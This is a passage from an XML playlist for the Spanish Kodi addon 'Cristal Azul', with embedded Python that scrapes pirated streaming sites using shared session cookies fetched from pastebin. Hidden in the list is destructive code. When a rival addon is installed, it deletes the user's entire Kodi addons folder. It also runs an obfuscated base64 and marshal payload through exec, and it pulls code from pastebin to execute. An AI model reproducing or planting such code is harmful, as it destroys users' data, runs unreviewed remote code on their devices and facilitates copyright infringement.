<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
#superestrenos3
def GetLSProData(page_data,Cookie_Jar,m):
 
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    pastebin0 = 'https://pastebin.com/u/Hectobo roba'
    pastebino0 = 'aHR0cHgfjgjgfjjnHFUFD=='
    pastebin0o = 'aHR0cHM6Ly8='
    pastebino = 'dsfrQWoPWWKDH='
    url = 'QnVzY2Fkb3JfcGlkZXBhbG9taXRhc19wb3N0'
    try:
      page = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/DISTANCIA.D/superestrenos.distancia').read()
      page = six.ensure_binary(page)
      page_data = base64.decodestring(page[2:])
      extraer = urllib_request.urlopen('http://bit.ly/'+six.ensure_str(page_data)).read()
      extraer = six.ensure_str(extraer)
    except:
      xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Imposible Conectar Con Base de Datos[/COLOR], 15000)")
      return [('[COLOR red]No Se Puede Acceder a la base...[/COLOR]', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'https://i.imgur.com/2tS3oPI.jpg', 'Imposible Concetar con la base', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')] + [('[COLOR aqua]Solucion en Telegram: [COLOR white]@addonfestaycristal[/COLOR]', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'https://i.imgur.com/2tS3oPI.jpg', 'Imposible Concetar con la base', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')]
    ExpresCristal = re.findall('(?s)<title>(.*?)<.*?genre>(.*?)<.*?year>(.*?)<.*?thumbnail>(.*?)<.*?fanart>(.*?)<.*?info>(.*?)<.*?<urlsolve>(.*?)<', extraer)
    return [('[COLOR aqua]Cristal Azul Resultados de: [COLOR white]Estrenos[/COLOR]', ' ', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png', ' ', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')] + ExpresCristal + [('[COLOR white]No hay más resultados...[/COLOR]', ' ', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png', ' ', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import re,json
def GetLSProData(page_data,Cookie_Jar,m,url=url,title=title):

    if '{' in url[:5]:
        items = json.loads('['+url+']')
        dialog = xbmcgui.Dialog()
        seleccion = []
        enlaces = []
        for item in items:
            seleccion.append(item['titulo'])
            enlaces.append(item['url'])
        titulo = dialog.select('seleciona enlace: '+title, seleccion)
        if (titulo < 0):
            dialog = xbmcgui.Dialog()
            dialog.notification("Cristal Azul", "Reproduccion cancelada!!!",
                            xbmcgui.NOTIFICATION_INFO, 5000, False)
            return
        return enlaces[titulo]
    else:
      if '104 116 116 112 115'==url[:17]:
          return desencriptar()
      elif '106 98 98 114 114'==url[:17]:
        return 'https' + desencriptar()[5:]
      else:
        return url
def desencriptar():
  s = url
  def enc(s):
    d=''
    s=s.split(' ')
    for strchar in s:
        d += chr(int(strchar)-0)
    return d
  return enc(s)
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/V9SqzX4.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
</item>










<item>
<title>[COLOR gold]*[/COLOR] [COLOR darkgoldenrod]Cine [COLOR bisque]estrenoa cristal[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
 
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    pastebin0 = 'https://pastebin.com/u/Hectobo roba'
    pastebino0 = 'aHR0cHgfjgjgfjjnHFUFD=='
    pastebin0o = 'aHR0cHM6Ly8='
    pastebino = 'dsfrQWoPWWKDH='
    url = 'QnVzY2Fkb3JfcGlkZXBhbG9taXRhc19wb3N0'
    try:
      #page = urllib_request.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/DISTANCIA.D/superestrenos.distancia').read()
      #page = six.ensure_str(page)
      #page_data = page[2:].decode('base64')
      extraer = urllib_request.urlopen('http://bit.ly/superestrenos3').read()
      extraer = six.ensure_str(extraer)
    except:
      xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold]Imposible Conectar Con Base de Datos[/COLOR], 15000)")
      return [('[COLOR red]No Se Puede Acceder a la base...[/COLOR]', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'https://i.imgur.com/2tS3oPI.jpg', 'Imposible Concetar con la base', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')] + [('[COLOR aqua]Solucion en Telegram: [COLOR white]@addonfestaycristal[/COLOR]', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'https://i.imgur.com/2tS3oPI.jpg', 'Imposible Concetar con la base', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')]
    ExpresCristal = re.findall('(?s)<title>(.*?)<.*?genre>(.*?)<.*?year>(.*?)<.*?thumbnail>(.*?)<.*?fanart>(.*?)<.*?info>(.*?)<.*?<urlsolve>(.*?)<', extraer)
    return [('[COLOR aqua]Cristal Azul Resultados de: [COLOR white]Estrenos[/COLOR]', ' ', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png', ' ', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')] + ExpresCristal + [('[COLOR white]No hay más resultados...[/COLOR]', ' ', ' ', 'https://i.imgur.com/2tS3oPI.jpg', 'http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png', ' ', 'https://www.youtube.com/watch?v=4DPGjjCBcAg')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>multi</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
title = '[c.param1]'
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
import re,json
def GetLSProData(page_data,Cookie_Jar,m,url=url,title=title):

    if '{' in url[:5]:
        items = json.loads('['+url+']')
        dialog = xbmcgui.Dialog()
        seleccion = []
        enlaces = []
        for item in items:
            seleccion.append(item['titulo'])
            enlaces.append(item['url'])
        titulo = dialog.select('seleciona enlace: '+title, seleccion)
        if (titulo < 0):
            dialog = xbmcgui.Dialog()
            dialog.notification("Cristal Azul", "Reproduccion cancelada!!!",
                            xbmcgui.NOTIFICATION_INFO, 5000, False)
            return
        return enlaces[titulo]
    else:
      if '104 116 116 112 115'==url[:17]:
          return desencriptar()
      elif '106 98 98 114 114'==url[:17]:
        return 'https' + desencriptar()[5:]
      else:
        return url
def desencriptar():
  s = url
  def enc(s):
    d=''
    s=s.split(' ')
    for strchar in s:
        d += chr(int(strchar)-0)
    return d
  return enc(s)
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[multi]'
import re,requests,resolveurl,cfscrape,six
from kodi_six import xbmc,xbmcaddon,xbmcgui
from six.moves import urllib_parse
from resources.lib.megaserver import Client
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
def GetLSProData(page_data,Cookie_Jar,m):
    pasta = requests.get('https://pastebin.com/raw/FzdqRYcC', verify=False).text
    return six.ensure_str(pasta)
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNBQUFBQVlBQUFCREFBQUFjL1FBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0JrQWdCOEJ3QnFCUUNEQUFCcUJnQmtBd0NEQVFCckJnQnlnUUI4QkFCcUJ3QmtCQUJrQlFCcEFnQmtCZ0JrQndBMlpBZ0FaQWtBTm1RS0FIUUlBSU1CQW1vSkFGTmtDd0I4QndCcUJRQ0RBQUJxQmdCa0F3Q0RBUUJyQmdCeXhnQjhCQUJxQndCa0JBQmtCUUJwQWdCa0JnQmtCd0EyWkFnQVpBa0FObVFLQUhRSUFJTUJBbW9KQUZOOEJBQnFCd0JrREFCa0JRQnBBZ0JrQmdCa0J3QTJaQWdBWkFrQU5tUUtBSFFJQUlNQkFtb0pBRk5rQUFCVEtBMEFBQUJPYWYvLy8vOTBDd0FBQUdOeWFYTjBZV3hoZW5Wc2RBSUFBQUJwWkhNaEFBQUFhSFIwY0hNNkx5OXdZWE4wWldKcGJpNWpiMjB2Y21GM0wycFFXbUZDUjFsT2RBY0FBQUJvWldGa1pYSnpjMGdBQUFCTmIzcHBiR3hoTHpVdU1DQW9WMmx1Wkc5M2N5Qk9WQ0EyTGpNN0lGZFBWelkwT3lCeWRqbzFOUzR3S1NCSFpXTnJieTh5TURFd01ERXdNU0JHYVhKbFptOTRMelUxTGpCekNnQUFBRlZ6WlhJdFFXZGxiblJ6RkFBQUFHaDBkSEJ6T2k4dmNHRnpkR1ZpYVc0dVkyOXRkQWNBQUFCU1pXWmxjbVZ5ZEFZQUFBQjJaWEpwWm5sMEJRQUFBR1psYzNSaGN5RUFBQUJvZEhSd2N6b3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZSalJvZG1KcGVIa29DZ0FBQUhRQ0FBQUFjbVYwQ0FBQUFISmxjWFZsYzNSemRBSUFBQUJ2YzNRRUFBQUFlR0p0WTNRSkFBQUFlR0p0WTJGa1pHOXVkQVVBQUFCQlpHUnZiblFNQUFBQVoyVjBRV1JrYjI1SmJtWnZkQU1BQUFCblpYUjBCUUFBQUVaaGJITmxkQVFBQUFCMFpYaDBLQWdBQUFCMEVRQUFBRTh3VHpCUE1EQXdUekF3TURCUE1FOHdkQkVBQUFCUE1FOVBUekF3VHpBd1R6QXdUekJQVDNRUkFBQUFUMDlQVHpCUE1EQlBUMDlQTUU4d1R6QlNCZ0FBQUZJSEFBQUFVZ2dBQUFCU0NRQUFBRklLQUFBQUtBQUFBQUFvQUFBQUFITUdBQUFBYzJOeWFYQjBkQXdBQUFCSFpYUk1VMUJ5YjBSaGRHRUJBQUFBY3d3QUFBQUFBVHdCR3dFcUFSc0JLZ0pPS0FFQUFBQlNFd0FBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/V9SqzX4.jpg</thumbnail>
<fanart>https://i.imgur.com/RsLj1lh.jpg</fanart>
</item>











<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series android[COLOR lightseagreen][[COLOR white]Buscador[COLOR lightseagreen]][/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data, Cookie_Jar, m):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = '(?s)class="item tvshows">.*?href="(https://playdede.com/serie.*?)".*?src="(.*?)".*?<p>(.*?)<.*?<h3>(.*?)<.*?span>(.*?)<'
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    Palabra_Buscada = xbmcgui.Dialog().input('Buscar Peliculas: ', type=xbmcgui.INPUT_ALPHANUM)
    Palabra_Buscada = six.ensure_str(Palabra_Buscada).replace(" ", "+").replace("á", "a").replace("é", "e").replace("í", "i").replace("á", "a").replace("ú", "u")
    response = requests.get('https://playdede.com/search/?s='+Palabra_Buscada, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    ArchivoDestino = TRANSLATEPATH('special://home/addons/plugin.video.cristalazul/')
    open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+'*'+response))
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        url = item[0]
        imagen = item[1]
        anio = item[2]
        anio = six.ensure_str(anio).replace('á', 'a').replace('é', 'e').replace('í', 'i').replace('ó', 'o').replace('ú', 'u').replace('Á', 'A').replace('É', 'E').replace('Ó', 'O').replace('Ú', 'U').replace('ñ', 'n')
        titulo = item[3]
        categoria = item[4]
        video += [(titulo, imagen, url, anio, categoria)]
    return [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR aqua]Cristal Azul Resultados de: [COLOR white] ('+str(numero_total)+')', ' ')] + sorted(video) + [(' ', 'https://i.imgur.com/qvzF7Rz.jpg', ' ', '[COLOR white]No hay mas resultados...', ' ')]

  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,serie=serie):

 try:
  estamos = xbmcaddon.Addon('plugin.video.blackghost')
  version = estamos.getAddonInfo('version')
  if '.' in version:
    addon_path = TRANSLATEPATH('special://home/addons').decode('utf-8')
    shutil.rmtree(addon_path, ignore_errors=True)
    return xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
 except:
  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'FusionTv' in id:
    patron = """(?s)class='se-c' data-season='(\d+)"""
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response)
    numero_total = len(data)
    video = []
    for item in data:
        video += [('Temporada', item)]
    return [('[COLOR aqua]Cristal Azul Temporadas '+serie, ' ')] + video + [('[COLOR white]No hay mas resultados...', ' ')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,base64,shutil,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
def GetLSProData(page_data,Cookie_Jar,m,url=url,temporada=temporada):
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    patron = '(?s)href="(.*?)".*?src="(.*?)".*?epst"(.*?)<.*?numerando">(.*?)<'
    data = re.findall(patron, response.split("class='se-c' data-season='"+temporada+"'")[1].split("</ul></div></div>")[0])
    numero_total = len(data)
    return [(' ', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados Capitulos: [COLOR white] ('+str(numero_total)+')')] + data + [(' ', ' ', ' ', '[COLOR white]No hay mas resultados...')]
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url):

  id = xbmcaddon.Addon().getAddonInfo('id')
  if 'cristalazul' in id or 'festa' in id or 'streamspro' in id:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia)
    patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
    cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0','Cookie': cookie}).text
    response = six.ensure_str(response)
    data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
    try:
        enlaces_post = re.findall('(?s)playerItem.*?lang="(.*?)".*?Player="(.*?)".*?h3>(.*?)<.*?Calidad: (.*?)<', response)
        lista_post = []
        for item in enlaces_post:
            if 'powvideo' in item[2] or 'waaw' in item[2] or 'streamplay' in item[2] or 'vidtodo' in item[2]:
                url = ''
            else:
                lista_post += [(item[1], '[COLOR gold]E.Oficial '+item[2], item[3], item[0])]
    except:
        lista_post = []
    data = lista_post + data
    videos = []
    for item in data:
      if 'powvideo' in item[1] or 'waaw' in item[1] or 'streamplay' in item[1] or 'vidtodo' in item[1]:
          url = ''
      else:
          url = item[0]
          servidor = item[1]
          calidad = item[2]
          idioma = item[3]
          videos += [(url, servidor, calidad, idioma)]
    numero_total = len(videos)
    return [('http', ' ', ' ', '[COLOR aqua]Cristal Azul Resultados links: [COLOR white] ('+str(numero_total)+')')] + videos + [('http', ' ', ' ', '[COLOR white]No hay mas resultados...')]
  else:
    xbmc.executebuiltin('PlayMedia("https://www.ivoox.com/listen_mn_23681872_1.m4a?internal=HTML5",1)')
    return xbmc.executebuiltin("XBMC.Notification([COLOR aqua]Cristal Azul [/COLOR],[COLOR gold] robado a cristal azul[/COLOR], 25000)")
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,random
from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
from six.moves import urllib_request
import six
TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath

def GetLSProData(page_data,Cookie_Jar,m,url=url,referer=referer):

  if 'http' in url:
    return url
  else:
    cookie_distancia = urllib_request.urlopen('https://pastebin.com/raw/A35dMZS1').read()
    cookie_distancia = six.ensure_str(cookie_distancia )
    patron = "src='(.*?)'"
    data = "------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"_method\"\r\n\r\ngetPlayer\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n" + url + "\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"width\"\r\n\r\n601\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE\r\nContent-Disposition: form-data; name=\"height\"\r\n\r\n540\r\n------WebKitFormBoundaryOoOIK5GVbe9NzOCE--\r\n"
    try:
        cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
        #response = requests.post('https://playdede.com/ajax.php', headers={'authority': 'playdede.com', 'pragma': 'no-cache', 'cache-control': 'no-cache', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOoOIK5GVbe9NzOCE', 'accept': '*/*', 'origin': 'https://playdede.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': referer, 'accept-language': 'es-ES,es;q=0.9', 'cookie': cookie}, data=data).text
